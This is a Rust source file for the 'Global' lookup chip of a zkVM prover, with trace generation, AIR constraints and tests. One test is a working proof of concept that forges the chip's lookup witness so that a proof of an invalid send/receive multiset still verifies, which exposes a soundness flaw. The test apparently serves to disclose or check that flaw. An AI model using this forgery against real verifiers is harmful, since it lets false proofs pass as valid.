use std::{borrow::Borrow, mem::transmute};

use p3_air::{Air, BaseAir, PairBuilder};
use p3_field::PrimeField32;
use p3_matrix::{dense::RowMajorMatrix, Matrix};
use rayon::iter::{
    IndexedParallelIterator, IntoParallelIterator, IntoParallelRefMutIterator, ParallelBridge,
    ParallelIterator,
};
use rayon_scan::ScanParallelIterator;
use std::borrow::BorrowMut;
use zkm_core_executor::{
    events::{ByteLookupEvent, ByteRecord, GlobalLookupEvent},
    ExecutionRecord, Program,
};
use zkm_stark::{
    air::{AirLookup, LookupScope, MachineAir},
    septic_curve::{SepticCurve, SepticCurveComplete},
    septic_digest::SepticDigest,
    septic_extension::{SepticBlock, SepticExtension},
    LookupKind, PicusInfo, ZKMAirBuilder,
};

use crate::{
    operations::{GlobalAccumulationOperation, GlobalLookupOperation},
    utils::{indices_arr, next_power_of_two, zeroed_f_vec},
    CoreChipError,
};
use zkm_derive::{AlignedBorrow, PicusAnnotations};

const NUM_GLOBAL_COLS: usize = size_of::<GlobalCols<u8>>();

/// Creates the column map for the CPU.
const fn make_col_map() -> GlobalCols<usize> {
    let indices_arr = indices_arr::<NUM_GLOBAL_COLS>();
    unsafe { transmute::<[usize; NUM_GLOBAL_COLS], GlobalCols<usize>>(indices_arr) }
}

const GLOBAL_COL_MAP: GlobalCols<usize> = make_col_map();

pub const GLOBAL_INITIAL_DIGEST_POS: usize = GLOBAL_COL_MAP.accumulation.initial_digest[0].0[0];

pub const GLOBAL_INITIAL_DIGEST_POS_COPY: usize = 64;

#[repr(C)]
pub struct Ghost {
    pub v: [usize; GLOBAL_INITIAL_DIGEST_POS_COPY],
}

#[derive(Default)]
pub struct GlobalChip;

#[derive(AlignedBorrow, PicusAnnotations, Clone, Copy)]
#[repr(C)]
pub struct GlobalCols<T: Copy> {
    pub message: [T; 7],
    pub kind: T,
    pub lookup: GlobalLookupOperation<T>,
    pub is_receive: T,
    pub is_send: T,
    pub is_real: T,
    pub accumulation: GlobalAccumulationOperation<T, 1>,
}

impl<F: PrimeField32> MachineAir<F> for GlobalChip {
    type Record = ExecutionRecord;

    type Program = Program;

    type Error = CoreChipError;

    fn name(&self) -> String {
        assert_eq!(GLOBAL_INITIAL_DIGEST_POS_COPY, GLOBAL_INITIAL_DIGEST_POS);
        "Global".to_string()
    }

    fn picus_info(&self) -> PicusInfo {
        GlobalCols::<u8>::picus_info()
    }

    fn generate_dependencies(
        &self,
        input: &Self::Record,
        output: &mut Self::Record,
    ) -> Result<(), Self::Error> {
        let events = &input.global_lookup_events;

        let chunk_size = std::cmp::max(events.len() / num_cpus::get(), 1);

        let blu_batches = events
            .chunks(chunk_size)
            .par_bridge()
            .map(|events| {
                let mut blu: Vec<ByteLookupEvent> = Vec::new();
                events.iter().for_each(|event| {
                    blu.add_u16_range_check(event.message[0].try_into().unwrap());
                });
                blu
            })
            .collect::<Vec<_>>();

        output.add_byte_lookup_events(blu_batches.into_iter().flatten().collect());
        Ok(())
    }

    fn num_rows(&self, input: &Self::Record) -> Option<usize> {
        let events = &input.global_lookup_events;
        let nb_rows = events.len();
        let size_log2 = input.fixed_log2_rows::<F, _>(self);
        let padded_nb_rows = next_power_of_two(
            nb_rows,
            size_log2,
            <GlobalChip as MachineAir<F>>::name(self).as_str(),
        );
        Some(padded_nb_rows)
    }

    fn generate_trace(
        &self,
        input: &Self::Record,
        _: &mut Self::Record,
    ) -> Result<RowMajorMatrix<F>, Self::Error> {
        let events = &input.global_lookup_events;

        let nb_rows = events.len();
        let padded_nb_rows = <GlobalChip as MachineAir<F>>::num_rows(self, input).unwrap();
        let mut values = zeroed_f_vec(padded_nb_rows * NUM_GLOBAL_COLS);
        let chunk_size = std::cmp::max(nb_rows / num_cpus::get(), 0) + 1;

        let mut chunks = values[..nb_rows * NUM_GLOBAL_COLS]
            .chunks_mut(chunk_size * NUM_GLOBAL_COLS)
            .collect::<Vec<_>>();

        let point_chunks = chunks
            .par_iter_mut()
            .enumerate()
            .map(|(i, rows)| {
                let mut point_chunks = Vec::with_capacity(chunk_size * NUM_GLOBAL_COLS + 1);
                if i == 0 {
                    point_chunks.push(SepticCurveComplete::Affine(SepticDigest::<F>::zero().0));
                }
                rows.chunks_mut(NUM_GLOBAL_COLS).enumerate().for_each(|(j, row)| {
                    let idx = i * chunk_size + j;
                    let cols: &mut GlobalCols<F> = row.borrow_mut();
                    let event: &GlobalLookupEvent = &events[idx];
                    cols.message = event.message.map(F::from_canonical_u32);
                    cols.kind = F::from_canonical_u8(event.kind);
                    cols.lookup.populate(
                        SepticBlock(event.message),
                        event.is_receive,
                        true,
                        event.kind,
                    );
                    cols.is_real = F::ONE;
                    if event.is_receive {
                        cols.is_receive = F::ONE;
                    } else {
                        cols.is_send = F::ONE;
                    }
                    point_chunks.push(SepticCurveComplete::Affine(SepticCurve {
                        x: SepticExtension(cols.lookup.x_coordinate.0),
                        y: SepticExtension(cols.lookup.y_coordinate.0),
                    }));
                });
                point_chunks
            })
            .collect::<Vec<_>>();

        let points = point_chunks.into_iter().flatten().collect::<Vec<_>>();
        let cumulative_sum = points
            .into_par_iter()
            .with_min_len(1 << 15)
            .scan(|a, b| *a + *b, SepticCurveComplete::Infinity)
            .collect::<Vec<SepticCurveComplete<F>>>();

        let final_digest = match cumulative_sum.last() {
            Some(digest) => digest.point(),
            None => SepticCurve::<F>::dummy(),
        };
        let dummy = SepticCurve::<F>::dummy();
        let final_sum_checker = SepticCurve::<F>::sum_checker_x(final_digest, dummy, final_digest);

        let chunk_size = std::cmp::max(padded_nb_rows / num_cpus::get(), 0) + 1;
        values.chunks_mut(chunk_size * NUM_GLOBAL_COLS).enumerate().par_bridge().for_each(
            |(i, rows)| {
                rows.chunks_mut(NUM_GLOBAL_COLS).enumerate().for_each(|(j, row)| {
                    let idx = i * chunk_size + j;
                    let cols: &mut GlobalCols<F> = row.borrow_mut();
                    if idx < nb_rows {
                        cols.accumulation.populate_real(
                            &cumulative_sum[idx..idx + 2],
                            final_digest,
                            final_sum_checker,
                        );
                    } else {
                        cols.lookup.populate_dummy();
                        cols.accumulation.populate_dummy(final_digest, final_sum_checker);
                    }
                });
            },
        );

        Ok(RowMajorMatrix::new(values, NUM_GLOBAL_COLS))
    }

    fn included(&self, _: &Self::Record) -> bool {
        true
    }

    fn commit_scope(&self) -> LookupScope {
        LookupScope::Global
    }
}

impl<F> BaseAir<F> for GlobalChip {
    fn width(&self) -> usize {
        NUM_GLOBAL_COLS
    }
}

impl<AB> Air<AB> for GlobalChip
where
    AB: ZKMAirBuilder + PairBuilder,
{
    fn eval(&self, builder: &mut AB) {
        let main = builder.main();
        let local = main.row_slice(0);
        let local: &GlobalCols<AB::Var> = (*local).borrow();
        let next = main.row_slice(1);
        let next: &GlobalCols<AB::Var> = (*next).borrow();

        // Receive the arguments, which consists of 7 message columns, `is_send`, `is_receive`, and `kind`.
        // In MemoryGlobal, MemoryLocal, Syscall chips, `is_send`, `is_receive`, `kind` are sent with correct constant values.
        // For a global send lookup, `is_send = 1` and `is_receive = 0` are used.
        // For a global receive lookup, `is_send = 0` and `is_receive = 1` are used.
        // For a memory global lookup, `kind = LookupKind::Memory` is used.
        // For a syscall global lookup, `kind = LookupKind::Syscall` is used.
        // Therefore, `is_send`, `is_receive` are already known to be boolean, and `kind` is also known to be a `u8` value.
        // Note that `local.is_real` is constrained to be boolean in `eval_single_digest`.
        builder.receive(
            AirLookup::new(
                vec![
                    local.message[0].into(),
                    local.message[1].into(),
                    local.message[2].into(),
                    local.message[3].into(),
                    local.message[4].into(),
                    local.message[5].into(),
                    local.message[6].into(),
                    local.is_send.into(),
                    local.is_receive.into(),
                    local.kind.into(),
                ],
                local.is_real.into(),
                LookupKind::Global,
            ),
            LookupScope::Local,
        );

        // Evaluate the lookup.
        GlobalLookupOperation::<AB::F>::eval_single_digest(
            builder,
            local.message.map(Into::into),
            local.lookup,
            local.is_receive.into(),
            local.is_send.into(),
            local.is_real,
            local.kind,
        );

        // Evaluate the accumulation.
        GlobalAccumulationOperation::<AB::F, 1>::eval_accumulation(
            builder,
            [local.lookup],
            [local.is_real],
            [next.is_real],
            local.accumulation,
            next.accumulation,
        );
    }
}

#[cfg(test)]
mod tests {
    use core::{borrow::Borrow, marker::PhantomData, mem::size_of};
    use std::{borrow::BorrowMut, sync::Arc};

    use super::*;
    use crate::programs::tests::simple_program;
    use crate::utils::{next_power_of_two, zeroed_f_vec};
    use p3_air::{Air, BaseAir};
    use p3_field::FieldAlgebra;
    use p3_koala_bear::KoalaBear;
    use p3_matrix::{dense::RowMajorMatrix, Matrix};
    use zkm_core_executor::{events::GlobalLookupEvent, ByteOpcode, ExecutionRecord, Executor};
    use zkm_derive::AlignedBorrow;
    use zkm_stark::{
        air::{AirLookup, LookupScope, MachineAir, ZKMAirBuilder},
        koala_bear_poseidon2::KoalaBearPoseidon2,
        septic_curve::{SepticCurve, SepticCurveComplete},
        septic_digest::SepticDigest,
        septic_extension::{SepticBlock, SepticExtension},
        Chip, CpuProver, LookupKind, MachineProof, MachineProver, StarkGenericConfig, StarkMachine,
        ZKMCoreOpts,
    };

    #[test]
    fn test_global_generate_trace() {
        let program = simple_program();
        let mut runtime = Executor::new(program, ZKMCoreOpts::default());
        runtime.run().unwrap();
        let shard = runtime.records[0].clone();

        let chip: GlobalChip = GlobalChip;

        let trace: RowMajorMatrix<KoalaBear> =
            chip.generate_trace(&shard, &mut ExecutionRecord::default()).unwrap();
        println!("{:?}", trace.values);

        for mem_event in shard.global_memory_finalize_events {
            println!("{mem_event:?}");
        }
    }

    #[derive(Debug, Clone, Copy, Default)]
    struct DummyGlobalSenderChip<F>(PhantomData<F>);

    #[derive(AlignedBorrow, Clone, Copy, Default)]
    #[repr(C)]
    struct DummyGlobalSenderCols<T: Copy> {
        message: [T; 7],
        kind: T,
        is_receive: T,
        is_send: T,
        is_real: T,
    }

    const NUM_DUMMY_GLOBAL_SENDER_COLS: usize = size_of::<DummyGlobalSenderCols<u8>>();

    impl<F: Sync> BaseAir<F> for DummyGlobalSenderChip<F> {
        fn width(&self) -> usize {
            NUM_DUMMY_GLOBAL_SENDER_COLS
        }
    }

    impl<F: PrimeField32> MachineAir<F> for DummyGlobalSenderChip<F> {
        type Record = ExecutionRecord;
        type Program = Program;
        type Error = CoreChipError;

        fn name(&self) -> String {
            "DummyGlobalSender".to_string()
        }

        fn preprocessed_width(&self) -> usize {
            1
        }

        fn generate_preprocessed_trace(
            &self,
            _program: &Self::Program,
        ) -> Option<RowMajorMatrix<F>> {
            Some(RowMajorMatrix::new(vec![F::ZERO; 16], 1))
        }

        fn num_rows(&self, input: &Self::Record) -> Option<usize> {
            Some(next_power_of_two(input.global_lookup_events.len(), None))
        }

        fn generate_trace(
            &self,
            input: &Self::Record,
            _output: &mut Self::Record,
        ) -> Result<RowMajorMatrix<F>, Self::Error> {
            let padded_nb_rows = next_power_of_two(input.global_lookup_events.len(), None);
            let mut values = zeroed_f_vec::<F>(padded_nb_rows * NUM_DUMMY_GLOBAL_SENDER_COLS);
            for (i, event) in input.global_lookup_events.iter().enumerate() {
                let cols: &mut DummyGlobalSenderCols<F> = values
                    [i * NUM_DUMMY_GLOBAL_SENDER_COLS..(i + 1) * NUM_DUMMY_GLOBAL_SENDER_COLS]
                    .borrow_mut();
                cols.message = event.message.map(F::from_canonical_u32);
                cols.kind = F::from_canonical_u8(event.kind);
                cols.is_real = F::ONE;
                if event.is_receive {
                    cols.is_receive = F::ONE;
                } else {
                    cols.is_send = F::ONE;
                }
            }
            Ok(RowMajorMatrix::new(values, NUM_DUMMY_GLOBAL_SENDER_COLS))
        }

        fn included(&self, shard: &Self::Record) -> bool {
            !shard.global_lookup_events.is_empty()
        }

        fn local_only(&self) -> bool {
            true
        }
    }

    impl<AB: ZKMAirBuilder> Air<AB> for DummyGlobalSenderChip<AB::F> {
        fn eval(&self, builder: &mut AB) {
            let main = builder.main();
            let local = main.row_slice(0);
            let local: &DummyGlobalSenderCols<AB::Var> = (*local).borrow();

            builder.assert_bool(local.is_real);
            builder.assert_bool(local.is_send);
            builder.assert_bool(local.is_receive);
            builder.assert_eq(local.is_send + local.is_receive, local.is_real);

            builder.send(
                AirLookup::new(
                    vec![
                        local.message[0].into(),
                        local.message[1].into(),
                        local.message[2].into(),
                        local.message[3].into(),
                        local.message[4].into(),
                        local.message[5].into(),
                        local.message[6].into(),
                        local.is_send.into(),
                        local.is_receive.into(),
                        local.kind.into(),
                    ],
                    local.is_real.into(),
                    LookupKind::Global,
                ),
                LookupScope::Local,
            );
        }
    }

    #[derive(Debug, Clone, Copy, Default)]
    struct DummyU16RangeChip<F>(PhantomData<F>);

    #[derive(AlignedBorrow, Clone, Copy, Default)]
    #[repr(C)]
    struct DummyU16RangeCols<T: Copy> {
        value: T,
        mult: T,
    }

    const NUM_DUMMY_U16_RANGE_COLS: usize = size_of::<DummyU16RangeCols<u8>>();

    impl<F: Sync> BaseAir<F> for DummyU16RangeChip<F> {
        fn width(&self) -> usize {
            NUM_DUMMY_U16_RANGE_COLS
        }
    }

    impl<F: PrimeField32> MachineAir<F> for DummyU16RangeChip<F> {
        type Record = ExecutionRecord;
        type Program = Program;
        type Error = CoreChipError;

        fn name(&self) -> String {
            "DummyU16Range".to_string()
        }

        fn num_rows(&self, input: &Self::Record) -> Option<usize> {
            let num_rows = input
                .byte_lookups
                .iter()
                .filter(|(lookup, _)| lookup.opcode == ByteOpcode::U16Range)
                .count();
            Some(next_power_of_two(num_rows.max(1), None))
        }

        fn generate_trace(
            &self,
            input: &Self::Record,
            _output: &mut Self::Record,
        ) -> Result<RowMajorMatrix<F>, Self::Error> {
            let mut lookups = input
                .byte_lookups
                .iter()
                .filter(|(lookup, _)| lookup.opcode == ByteOpcode::U16Range)
                .map(|(lookup, mult)| (lookup.a1, *mult))
                .collect::<Vec<_>>();
            lookups.sort_by_key(|(value, _)| *value);

            let padded_nb_rows = next_power_of_two(lookups.len().max(1), None);
            let mut values = zeroed_f_vec::<F>(padded_nb_rows * NUM_DUMMY_U16_RANGE_COLS);
            for (i, (value, mult)) in lookups.into_iter().enumerate() {
                let cols: &mut DummyU16RangeCols<F> = values
                    [i * NUM_DUMMY_U16_RANGE_COLS..(i + 1) * NUM_DUMMY_U16_RANGE_COLS]
                    .borrow_mut();
                cols.value = F::from_canonical_u16(value);
                cols.mult = F::from_canonical_usize(mult);
            }

            Ok(RowMajorMatrix::new(values, NUM_DUMMY_U16_RANGE_COLS))
        }

        fn included(&self, shard: &Self::Record) -> bool {
            shard.byte_lookups.iter().any(|(lookup, _)| lookup.opcode == ByteOpcode::U16Range)
        }

        fn local_only(&self) -> bool {
            true
        }
    }

    impl<AB: ZKMAirBuilder> Air<AB> for DummyU16RangeChip<AB::F> {
        fn eval(&self, builder: &mut AB) {
            let main = builder.main();
            let local = main.row_slice(0);
            let local: &DummyU16RangeCols<AB::Var> = (*local).borrow();

            builder.receive_byte(
                AB::Expr::from_canonical_u8(ByteOpcode::U16Range as u8),
                local.value,
                AB::Expr::zero(),
                AB::Expr::zero(),
                local.mult,
            );
        }
    }

    #[derive(zkm_derive::MachineAir)]
    enum TestAir<F: PrimeField32> {
        DummyGlobalSender(DummyGlobalSenderChip<F>),
        DummyU16Range(DummyU16RangeChip<F>),
        Global(GlobalChip),
    }

    fn make_test_record(program: Arc<Program>) -> ExecutionRecord {
        let kind = LookupKind::Memory as u8;
        let mut record = ExecutionRecord::new(program);
        // The visible interaction multiset is intentionally invalid: a send of A and a receive of
        // B with A != B. If the global lookup relation were sound, this shard should not be able
        // to prove a zero global digest.
        record.global_lookup_events = vec![
            GlobalLookupEvent { message: [1, 10, 20, 30, 40, 50, 60], is_receive: false, kind },
            GlobalLookupEvent { message: [2, 11, 21, 31, 41, 51, 61], is_receive: true, kind },
        ];
        record
    }

    fn find_forged_message<F: PrimeField32>(
        send_message: [u32; 7],
        receive_message: [u32; 7],
        kind: u8,
    ) -> [u32; 7] {
        // Search for a third message C such that:
        // 1. C is different from both honest row messages A and B.
        // 2. The mapped send/receive points for C cancel in the accumulator.
        // 3. The intermediate sums avoid the elliptic-curve exceptional cases used by the AIR.
        //
        // We only need one concrete forged witness, so a tiny brute-force search is sufficient for
        // the PoC.
        let zero_digest = SepticDigest::<F>::zero().0;
        for candidate in 3..1024 {
            let values = [candidate, 17, 23, 29, 31, 37, 41];
            if values == send_message || values == receive_message {
                continue;
            }

            let (send_point, _) =
                GlobalLookupOperation::<F>::get_digest(SepticBlock(values), false, kind);
            let (receive_point, _) =
                GlobalLookupOperation::<F>::get_digest(SepticBlock(values), true, kind);

            let sum1_complete =
                SepticCurveComplete::Affine(zero_digest) + SepticCurveComplete::Affine(send_point);
            if sum1_complete.is_infinity() {
                continue;
            }
            let sum1 = sum1_complete.point();

            let sum2_complete = sum1_complete + SepticCurveComplete::Affine(receive_point);
            if sum2_complete.is_infinity() {
                continue;
            }
            let sum2 = sum2_complete.point();

            if sum2 != zero_digest {
                continue;
            }

            let zero = SepticExtension::<F>::ZERO;
            if SepticCurve::<F>::sum_checker_x(zero_digest, send_point, sum1) != zero
                || SepticCurve::<F>::sum_checker_y(zero_digest, send_point, sum1) != zero
                || SepticCurve::<F>::sum_checker_x(sum1, receive_point, sum2) != zero
                || SepticCurve::<F>::sum_checker_y(sum1, receive_point, sum2) != zero
            {
                continue;
            }

            let honest_send =
                GlobalLookupOperation::<F>::get_digest(SepticBlock(send_message), false, kind).0;
            let honest_receive =
                GlobalLookupOperation::<F>::get_digest(SepticBlock(receive_message), true, kind).0;

            if send_point != honest_send && receive_point != honest_receive {
                return values;
            }
        }

        panic!("failed to find a forged global-lookup message");
    }

    fn forge_global_trace<F: PrimeField32>(
        events: &[GlobalLookupEvent],
        forged_message: [u32; 7],
    ) -> RowMajorMatrix<F> {
        assert_eq!(events.len(), 2, "the PoC expects exactly two global lookup events");
        assert!(!events[0].is_receive && events[1].is_receive, "expected send then receive");
        assert_eq!(events[0].kind, events[1].kind, "expected a shared lookup kind");

        let padded_nb_rows = next_power_of_two(events.len(), None);
        let mut values = zeroed_f_vec::<F>(padded_nb_rows * NUM_GLOBAL_COLS);

        for (i, event) in events.iter().enumerate() {
            let cols: &mut GlobalCols<F> =
                values[i * NUM_GLOBAL_COLS..(i + 1) * NUM_GLOBAL_COLS].borrow_mut();
            // Keep the visible tuple columns honest. These are the values that participate in the
            // cross-table lookup with DummyGlobalSender.
            cols.message = event.message.map(F::from_canonical_u32);
            cols.kind = F::from_canonical_u8(event.kind);
            cols.is_real = F::ONE;
            if event.is_receive {
                cols.is_receive = F::ONE;
            } else {
                cols.is_send = F::ONE;
            }
        }

        let kind = events[0].kind;
        {
            let row0: &mut GlobalCols<F> = values[0..NUM_GLOBAL_COLS].borrow_mut();
            // Replace the honest witness for send(A) with the witness for send(C).
            row0.lookup.populate(SepticBlock(forged_message), false, true, kind);
        }
        {
            let row1: &mut GlobalCols<F> =
                values[NUM_GLOBAL_COLS..2 * NUM_GLOBAL_COLS].borrow_mut();
            // Replace the honest witness for receive(B) with the witness for receive(C).
            row1.lookup.populate(SepticBlock(forged_message), true, true, kind);
        }

        let row0_lookup: &GlobalCols<F> = values[0..NUM_GLOBAL_COLS].borrow();
        let row1_lookup: &GlobalCols<F> = values[NUM_GLOBAL_COLS..2 * NUM_GLOBAL_COLS].borrow();
        let points = vec![
            SepticCurveComplete::Affine(SepticDigest::<F>::zero().0),
            SepticCurveComplete::Affine(SepticCurve {
                x: SepticExtension(row0_lookup.lookup.x_coordinate.0),
                y: SepticExtension(row0_lookup.lookup.y_coordinate.0),
            }),
            SepticCurveComplete::Affine(SepticCurve {
                x: SepticExtension(row1_lookup.lookup.x_coordinate.0),
                y: SepticExtension(row1_lookup.lookup.y_coordinate.0),
            }),
        ];
        // Accumulate the forged points, not the honest tuple-derived points. Since the two forged
        // rows use send(C) and receive(C), the sum comes back to zero even though the visible tuple
        // multiset is send(A), receive(B).
        let cumulative_sum = points
            .into_iter()
            .scan(SepticCurveComplete::Infinity, |acc, point| {
                *acc = *acc + point;
                Some(*acc)
            })
            .collect::<Vec<_>>();

        let final_digest = *cumulative_sum.last().expect("expected a final digest");
        assert_eq!(final_digest, SepticCurveComplete::Affine(SepticDigest::<F>::zero().0));

        let final_digest_point = final_digest.point();
        let dummy = SepticCurve::<F>::dummy();
        let final_sum_checker =
            SepticCurve::<F>::sum_checker_x(final_digest_point, dummy, final_digest_point);

        for row_idx in 0..padded_nb_rows {
            let cols: &mut GlobalCols<F> =
                values[row_idx * NUM_GLOBAL_COLS..(row_idx + 1) * NUM_GLOBAL_COLS].borrow_mut();
            if row_idx < events.len() {
                cols.accumulation.populate_real(
                    &cumulative_sum[row_idx..row_idx + 2],
                    final_digest_point,
                    final_sum_checker,
                );
            } else {
                cols.lookup.populate_dummy();
                cols.accumulation.populate_dummy(final_digest_point, final_sum_checker);
            }
        }

        RowMajorMatrix::new(values, NUM_GLOBAL_COLS)
    }

    #[test]
    fn test_global_lookup_forged_witness_poc() {
        type SC = KoalaBearPoseidon2;
        type F = KoalaBear;

        // Build a tiny machine with:
        // - DummyGlobalSender: emits the honest global lookup tuples.
        // - DummyU16Range: satisfies the byte lookup side-condition used by GlobalLookupOperation.
        // - Global: the real chip under test.
        let program = Program::new(vec![], 0, 0);
        let machine = StarkMachine::new(
            SC::default(),
            vec![
                Chip::new(TestAir::DummyGlobalSender(DummyGlobalSenderChip::default())),
                Chip::new(TestAir::DummyU16Range(DummyU16RangeChip::default())),
                Chip::new(TestAir::Global(GlobalChip)),
            ],
            0,
        );
        let prover = CpuProver::new(machine);
        let (pk, vk) = prover.setup(&program);

        let mut record = make_test_record(Arc::new(program.clone()));
        // Generate the byte dependencies that the global lookup AIR expects.
        prover
            .machine()
            .generate_dependencies(std::slice::from_mut(&mut record), &ZKMCoreOpts::default(), None)
            .unwrap();

        // Find a forged message C whose send/receive points cancel.
        let forged_message = find_forged_message::<F>(
            record.global_lookup_events[0].message,
            record.global_lookup_events[1].message,
            record.global_lookup_events[0].kind,
        );

        let mut named_traces = prover.generate_traces(&record).unwrap();
        // Overwrite only the Global trace. All other traces remain honest.
        let global_trace = forge_global_trace::<F>(&record.global_lookup_events, forged_message);
        let global_idx = named_traces.iter().position(|(name, _)| name == "Global").unwrap();
        named_traces[global_idx].1 = global_trace;

        // Prove and verify the forged shard.
        let main_data = prover.commit(&record, named_traces);
        let mut prover_challenger = prover.machine().config().challenger();
        pk.observe_into(&mut prover_challenger);
        let shard_proof = prover.open(&pk, main_data, &mut prover_challenger).unwrap();
        assert!(shard_proof.global_cumulative_sum().is_zero());

        // This is the crux of the PoC: the proof verifies even though the visible interaction
        // multiset is send(A), receive(B) with A != B. The only way this can happen is that the
        // AIR never links the lookup witness point back to the tuple columns.
        let proof = MachineProof { shard_proofs: vec![shard_proof] };
        let mut verifier_challenger = prover.machine().config().challenger();
        prover.machine().verify(&vk, &proof, &mut verifier_challenger).unwrap();
    }
}
